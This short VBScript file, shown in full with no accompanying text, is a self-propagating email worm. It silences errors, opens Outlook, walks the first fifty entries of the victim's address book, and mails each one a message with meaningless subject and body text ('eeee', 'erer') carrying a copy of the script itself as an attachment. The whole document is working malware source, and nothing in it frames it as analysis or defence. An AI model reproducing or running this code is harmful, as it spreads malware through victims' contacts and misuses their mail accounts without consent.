On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Dim OutlookObject, OutMail, Index
Set OutlookObject = CreateObject("Outlook.Application")
For Index = 1 To 50
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to =
OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "eeee "
OutMail.Body = "erer"
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Next
